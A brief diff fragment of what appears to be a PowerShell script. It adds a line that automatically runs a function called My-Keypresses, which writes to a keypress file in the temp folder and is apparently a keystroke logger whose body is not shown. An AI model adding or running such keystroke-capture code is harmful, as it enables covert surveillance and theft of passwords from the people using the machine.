@@ -48,3 +48,5 @@ function My-Keypresses($Path="$env:temp\mykeypress.txt")
    {
    }
  };
+ 
+ powershell -noprofile My-Keypresses
